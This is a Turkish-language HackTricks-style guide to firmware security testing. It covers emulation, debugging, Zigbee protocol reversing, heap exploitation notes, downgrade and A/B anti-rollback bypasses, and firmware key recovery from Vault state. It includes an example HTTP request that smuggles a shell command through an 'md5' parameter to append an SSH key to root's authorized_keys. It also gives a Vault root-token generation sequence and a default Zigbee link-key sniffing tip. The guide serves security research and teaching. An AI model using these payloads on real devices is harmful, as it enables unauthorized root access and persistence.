[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, tüm firmware'in emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emulation için bölünmüş ve doğrulanmış kök dosya sistemlerini yeniden oluşturma

Bir SquashFS superblock okunabilir durumdaysa ancak inode, dizin veya parça tablosu ofsetleri olanaksız görünüyorsa, `unsquashfs` aracına hemen yama uygulamayın. Erken başlatma ikilisini tersine mühendislikle inceleyin ve oluşturduğu blok aygıtı grafiğini yeniden oluşturun: gömülü sistemler görünürde bir kök bölümü sunabilir, ancak gerçek dosya sistemini başka bir bölümden alınan sektörleri ekleyen bir `dm-linear` eşlemesiyle oluşturabilir. Yalnızca superblock'ı denetleyen kontroller başarılı olabilir; buna karşın sonraki tüm metadata bloklarının konumu kaymış olabilir.<sup>[[11]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların bayt mı, 512 baytlık sektör mü, yoksa 4 KiB'lık sayfa mı olduğunu belirleyin; kaydırma ve kesme işlemlerini özgün sıralarıyla uygulayın ve A/B düzenlerindeki bankaya bağlı son bölgeleri hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce değeri 4 KiB sınırına göre keser, ardından sonucu 512 baytlık sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen kapsamı birkaç kilobayt kaydırıp sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Yararlı bir doğrulama iş akışı şöyledir:<sup>[[11]](#references)</sup>

1. Doğrulayıcı/init ikilisinden her `dm-linear` segmentinin kaynak aygıtını, başlangıç sektörünü ve uzunluğunu çıkarın.
2. Hizalama semantiğini değiştirmeden kapsamları birleştirin veya eşleyin.
3. Çıkarma yine başarısız olursa tahmin edilen sınırın çevresindeki dar bir aralıkta arama yapın ve tek başına makul görünen bir superblock'ı kabul etmek yerine art arda birkaç geçerli metadata yapısının bulunmasını şart koşun.
4. Yeniden oluşturulan imaj üzerinde değiştirilmemiş bir `unsquashfs` çalıştırın; tüm dizinlerin ve parçaların başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analyst-controlled dm-verity replacement

Analist QEMU çekirdeğini, initramfs'i ve sanal diskleri kontrol ediyorsa, üreticinin doğrulama PID 1 işlemi küçük, statik olarak bağlanmış bir init ile değiştirilerek değiştirilmiş bir kök başlatılabilir. Bu, bir **lab boot-chain substitution** işlemidir; dm-verity'yi, RSA imzasını, Secure Boot'u veya TPM ile mühürlenmiş bir anahtarı kırmaz.<sup>[[11]](#references)</sup>

Yeni init, özgün başlatma yolunun operasyonel adımlarını taklit etmelidir: `devtmpfs` bağlamak, `setsid()` çağırmak, `/dev/console` aygıtını 0–2 dosya tanımlayıcılarına bağlamak, `/proc` ve `/sys` bağlamak, sağlanan blok aygıtını beklemek, düzenlenmiş kökü salt okunur olarak bağlamak, eski kökün sahte dosya sistemlerini ayırmak, yeni bağlama noktasını `/` üzerine taşımak, `chroot` yapmak ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile çalıştırmak. `/dev`, `/proc` ve `/sys` aygıtlarını `MS_MOVE` işleminden **önce** ayırmak, yeni köke ait bağlama noktalarının yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir aygıt durumunu değiştirilmiş, değişmez kökten ayrı tutun. Bir qcow2 overlay, özgün diskin LVM durumunu korurken ikinci, salt okunur bir virtio diski düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı imaj durumu hata ayıklaması

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri hatayı gizlediğinde, guest dışındaki kalıcı durumu inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; imajı `qemu-nbd` ile erişime açın, LVM keşfini hedeflenen NBD bölümüyle sınırlandırın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için, kararlı ve yazılabilir bir birime zaman damgalı işaretçi dosyaları yazın ve bunları çevrimdışı doğrulayın; `/dev/kmsg`, FIFO'lar ve geçici konsollar, hız sınırlaması veya sürecin erken sonlanması nedeniyle yanlış negatiflere yol açabilir. Ayrıca ilgisiz kodu değiştirmeden önce katmanlar arasındaki arayüzleri birebir karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` sürümü ile DRI sürücü ABI'si ve PCI'dan türetilen sürücü adları. Bir bileşen mevcut olabilir ve hatta `dlopen()` başarılı olabilir; ancak onu kullanan bileşen farklı bir ABI beklediği için bileşen kullanılamaz durumda kalabilir.<sup>[[11]](#references)</sup>

## Uygulamada Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS'ye ve dosya sistemine shell erişimini sürdürmek çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit edemeyebilir; bu nedenle zaman zaman emülasyonu yeniden başlatmak gerekebilir. Analizde dosya sistemi yeniden incelenmeli, dışarıya açık web sayfaları ve ağ hizmetleri exploit edilmeli, bootloader açıkları araştırılmalıdır. Olası backdoor açıklarını belirlemek için firmware bütünlük testleri kritik önem taşır.

## Çalışma Zamanı Analizi Teknikleri

Çalışma zamanı analizi, bir süreç veya binary ile kendi çalışma ortamında etkileşim kurmayı kapsar. Breakpoint ayarlamak ve fuzzing ile diğer teknikler aracılığıyla açıkları belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlardan yararlanılır.

Tam bir debugger bulunmayan embedded hedeflerde, **statik bağlı bir `gdbserver`'ı** cihaza kopyalayın ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşleme

IoT hub'larında RF stack'i genellikle bir **radio MCU** ile Linux userland process'i arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada iletilen **RF frame**
2. Radio MCU'daki **controller-side parser**
3. Linux'a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon'daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki tersine mühendislik hedefi oluşturur. Controller, binary radio frame'leri `Group,Command,arg1,arg2,...` gibi bir textual protocol'e dönüştürüyorsa şunları ortaya çıkarın:

- **Message group**'ları ve dispatch table'ları
- Hangi mesajların **network**'ten, hangilerinin controller'ın kendisinden gelebileceği
- **Manufacturer-specific discriminator field**'larının tam olarak hangileri olduğu (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Hangi handler'lara yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebildiği

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Öyleyse commissioning trafiğini dinlemek **Network Key**'i açığa çıkarabilir. Zigbee 3.0 install code'ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handler'ları ve FSM ile kısıtlanan erişilebilirlik

Vendor-specific Zigbee/ZCL komutları, standartlaştırılmış cluster'lara kıyasla çoğu zaman daha iyi bir hedeftir; çünkü daha az kapsamlı biçimde test edilmiş doğrulamalara sahip **custom parsing code**'u ve dahili **FSM**'leri beslerler.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- **Vendor-only handler**'ı bulana kadar command dispatcher'ı tersine mühendislikle inceleyin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table'larını ortaya çıkarın.
- Otomatik ilerleyen **transitional state**'leri ve saldırganın kontrolündeki state'i sonunda sıfırlayan veya serbest bırakan retry/error branch'lerini belirleyin.
- Hatalı handler'ın her zaman erişilebilir olduğunu varsaymak yerine, daemon'ı güvenlik açığı bulunan state'e getirmek için gereken meşru protocol exchange'lerini doğrulayın.

Zamanlamaya duyarlı protocol'lerde Python framework'üyle paket replay'i çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**'leri, **attribute**'ları ve commissioning zamanlamasını ortaya çıkarmak için vendor-grade stack kullanan gerçek donanımda (örneğin **nRF52840**) meşru bir cihazı taklit etmektir.

### Embedded daemon'larda parçalı indirme bug sınıfı

**Fragmented blob/model/configuration download** işlemlerinde yinelenen bir firmware bug sınıfı görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment'ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrolündeki **packet-local** alanları doğrular.
3. Kopyalama işlemi, özgün ayrılan boyutu kontrol etmeden `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation'ı zorlamak için beyan edilen toplam boyutu **küçük** olan geçerli bir ilk fragment.
- **Beklenen offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- Yeni kontrolleri karşılarken özgün ayrılmış buffer'ı taşıran, sahte bir packet-local size.

Güvenlik açığı bulunan yol commissioning logic'in arkasındaysa, hatalı fragment'leri göndermeden önce hedefi beklenen model-download veya blob-download state'ine getirmek için yeterli **device emulation** kullanılmalıdır.

### Protocol kaynaklı `free()` tetikleyicileri

Embedded daemon'larda heap metadata exploitation'ı tetiklemenin en kolay yolu çoğu zaman "temizliği beklemek" değil, **protocol'ün kendi error handling'ini zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM'i **retry** veya **error** state'lerine geçirmek için hatalı devam fragment'leri gönderin.
- Retry eşiğini aşarak daemon'ın **context'i sıfırlamasını** ve bozulmuş buffer'ı serbest bırakmasını sağlayın.
- Process başka nedenlerle çökmeden önce allocator-side primitive'leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yöntem, embedded Linux'taki **musl/uClibc/dlmalloc benzeri** allocator'lara karşı özellikle yararlıdır; chunk metadata'sını bozmak, unlink/unbin logic'ini bir write primitive'e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer'larını hemen ezip process'i çökertmek yerine, allocator traversal'ını **overflowed buffer** içine yerleştirilmiş **fake chunk**'lara yönlendirmek için bir **size field**'ını bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen güvenlik açıkları için PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve daha düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded system'lerde binary runtime protection'lar nadir görülür; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin'ler + consolidation:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonra yapılan büyük bir allocation, `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle fake chunk tüm kontrolleri (makul bir size, `fd = 0` ve çevresindeki chunk'ların "in use" olarak görülmesi) geçmelidir.<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary'ler:** ASLR etkinse ancak ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation'ını bir **function pointer table** üzerine düşürmek için geçerli bir heap chunk header'ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser'ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, stack pivot/ROP chain için saldırganın kontrolündeki sondaki byte'ları korurken parsing'i durdurabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, çalıştırılabilir shellcode'u bilinen bir mapping'e yerleştirip oraya atlayabilir.

## Firmware Analysis için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Firmware Analysis için Hazır OS'ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerinde yardımcı olmak üzere tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sağlayarak size zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Attacks ve Güvenli Olmayan Update Mechanism'leri

Bir vendor, firmware image'ları için cryptographic signature kontrolü uygulasa bile **version rollback (downgrade) protection** çoğu zaman ihmal edilir. Boot veya recovery loader, yalnızca embedded public key ile signature'ı doğruluyor ve yüklenen image'ın *version* değerini (veya monotonic counter'ı) karşılaştırmıyorsa saldırgan, geçerli bir signature taşıyan **daha eski ve güvenlik açığı bulunan bir firmware'i** meşru biçimde yükleyebilir ve böylece yamalanmış güvenlik açıklarını yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Vendor'ın herkese açık indirme portalından, CDN'inden veya destek sitesinden alın.
   * Companion mobile/desktop application'lardan çıkarın (ör. bir Android APK'sındaki `assets/firmware/` dizininden).
   * VirusTotal, Internet archive'ları, forumlar vb. gibi üçüncü taraf repository'lerden alın.
2. Image'ı, açık olan herhangi bir update channel üzerinden cihaza **yükleyin veya cihaza sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok consumer IoT cihazı, Base64 ile kodlanmış firmware blob'larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint'leri sunar.
3. Downgrade işleminden sonra daha yeni sürümde yamalanmış bir güvenlik açığından yararlanın (örneğin daha sonra eklenen bir command-injection filter).
4. İsteğe bağlı olarak persistence elde ettikten sonra tespit edilmemek için en güncel image'ı yeniden yükleyin veya update'leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (downgrade edilmiş) firmware'de `md5` parametresi sanitizasyon uygulanmadan doğrudan bir shell komutuna ekleniyor ve bu da rastgele komutların enjekte edilmesine olanak tanıyor (burada SSH anahtar tabanlı root erişimini etkinleştiriyor). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak downgrade korumasının olmaması düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarına dahil eder. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollarda şifrelenmeden saklanır. `apktool`, `ghidra` veya basitçe `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı imajları çıkarmanızı sağlar.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater'da uygulanan anti-rollback korumasını atlatma

Bazı üreticiler anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında yapar (örneğin CAN üzerinden bir UDS rutini, recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image imzasını/CRC'yi kontrol edip partition table'a veya slot metadata'sına güveniyorsa rollback koruması yine de atlatılabilir.<sup>[[7]](#references)</sup>

Yaygın zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da tutulan bir değerle karşılaştırır ve daha eski imzalı image'ları reddeder.
- Bootloader bu ratchet'i **ayrıştırmaz**; boot etmeden önce yalnızca header, CRC ve imzayı doğrular.
- Slot etkinleştirme bilgisi ayrı olarak bir partition table'da veya slot başına tutulan generation counter'da saklanır ve doğrulanan firmware'in tam digest'iyle **kriptografik olarak bağlanmamıştır**.

Bu, çift slotlu sistemlerde **bir image'ı doğrula / başka bir image'ı boot et** primitive'ini oluşturur. Saldırgan, updater'a güncel imzalı bir image ile slot B'yi bir sonraki boot hedefi olarak işaretletebilir ve ardından yeniden başlatmadan önce slot B'nin üzerine yazabilirse, bootloader yalnızca önceden commit edilmiş slot metadata'sına güvendiğinden eski image'ı boot edebilir.

Yaygın kötüye kullanım örüntüsü:

1. Pasif slota **güncel imzalı** bir firmware yükleyin ve layout'un bu slotu bir sonraki etkin slot olarak işaretlemesi için normal doğrulama/değiştirme rutinini çalıştırın.
2. **Henüz yeniden başlatmayın**. Aynı oturumda slot hazırlama/silme rutinini yeniden çalıştırın.
3. Updater'ın az önce etkinleştirilen **aynı fiziksel slotu** silmesine yol açmak için güncelliğini yitirmiş boot-state veya slot-seçim mantığını kötüye kullanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan doğrulama rutinini atlayın ve doğrudan yeniden başlatın.
6. Bootloader etkinleştirilen slotu seçer, yalnızca imzayı/bütünlüğü doğrular ve eski image'ı boot eder.

A/B update uygulamalarını incelerken bakılması gerekenler:

- Başarılı bir değişiklikten sonra yenilenmeyen **boot-time flags** değerlerinden türetilen slot seçimi.
- **Mevcut commit edilmiş layout** yerine güncelliğini yitirmiş state'e göre slot silen `prepare_passive_slot()` benzeri bir rutin.
- Doğrulanan image hash'ini saklamayıp yalnızca **generation counter** / etkin flag değerini artıran `part_write_layout()` benzeri bir fonksiyon.
- Userspace veya updater kodunda uygulanan, ancak ROM / bootloader / secure boot aşamalarında **uygulanmayan** ratchet kontrolleri.
- İçeriği silinip yeniden yazıldıktan sonra bile slotu boot edilebilir olarak işaretli bırakan silme veya recovery rutinleri.

### Update Mantığını Değerlendirme Kontrol Listesi

* *Update endpoint*'in taşıma/kimlik doğrulama mekanizması yeterince korunuyor mu (TLS + authentication)?
* Cihaz, flash etmeden önce **version number** değerlerini veya **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. imzalar ROM kodu tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca imza/CRC kontrolü yapmak yerine updater ile aynı ratchet'i uyguluyor mu?
* Slot etkinleştirme metadata'sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa etkinleştirildikten sonra slot değiştirilebilir mi?
* Slot değişikliği başarılı olduktan sonra cihaz yeniden başlatılmaya zorlanıyor mu, yoksa aynı oturumda sonraki update/silme rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sağlamlık kontrolleri (ör. izin verilen partition map, model number) gerçekleştiriyor mu?
* *Kısmi* veya *yedekleme* update akışları aynı doğrulama mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware'ler

Firmware'deki zafiyetleri keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki savunmasız firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware şifre çözme anahtarlarını kurtarma

Bir update image, az miktarda plaintext metadata'yı yüksek entropili büyük bir blob ile birleştiriyorsa herhangi bir brute-force işlemine başlamadan önce container triyajı yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile header'ları, offset'leri ve satır sınırlarını dökün.
- `Salted__` genellikle OpenSSL `enc` formatını belirtir: sonraki 8 byte salt, kalan byte'lar ise ciphertext'tir.
- Tam olarak `256` byte'a çözümlenen bir Base64 alanı, büyük olasılıkla rastgele bir firmware password/session key değerini sarmalayan bir RSA-2048 ciphertext'e baktığınıza dair güçlü bir ipucudur.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca authenticity'yi korur; bunu confidentiality mekanizması olarak varsaymayın.

Statik anahtar arama (`grep`, `strings`, PEM/PGP aramaları) başarısız olursa yalnızca private key'leri aramak yerine **operational decrypt path**'i tersine inceleyin:

- Updater / management binary'sini decompile edin ve şifrelenmiş blob'u kimin okuduğunu, hangi helper/API'nin onu açtığını ve hangi mantıksal key name değerinin istendiğini izleyin.
- KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'lar ve init script'ler için çıkarılan root filesystem'de arama yapın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'ları veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa, bu ortamı yeniden çalıştırmak genellikle Vault iç işleyişini yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root erişiminiz varken:

- Transit keys’i yalnızca izole klonda dışa aktarılabilir yapın: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key’i dışa aktarın: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key’i, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 ile yapılan başarısız bir decrypt işlemi ve varsayılan OAEP decrypt işleminin başarısız olması, key’in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa AES-CBC decrypt işleminden önce üreticinin OpenSSL KDF’sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) tam olarak yeniden uygulayın.

Bu, "encrypted firmware" sorununu daha genel bir probleme dönüştürür: **cihaz tarafındaki operasyonel key’leri kurtarın, ardından tam unwrap + KDF parametrelerini çevrimdışı olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Kıdemli Düzeyde Beceri, Başlangıç Düzeyinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnterneti'ne Saldırmak İçin Kesin Kılavuz](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk Edilmiş Donanımlardaki Zero-Day Açıklarından Yararlanma – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Akıllı Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Gördün: Şimdi Pwned Oldun](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'a şarj portu konektöründen saldırı - Bölüm 2: anti-downgrade korumasını atlatma](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Işığı Yak: Philips Hue Bridge'e Kablosuz Güncelleme Üzerinden Saldırı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU Üzerinde ROOT Tesla OS Bölüm 1: Paketleri Açma](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU Üzerinde ROOT Tesla OS Bölüm 2: Hata Ayıklama ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi, SPI Flash'tan Kurtarmaya Olanak Tanıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parola kurtarma araçları](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Donanım Hacking Üzerine Bilgileri Tazeleme Bölüm 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cypherock Donanım Cüzdanını Nasıl ve Neden Hackledik: Tüm Hikâye](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
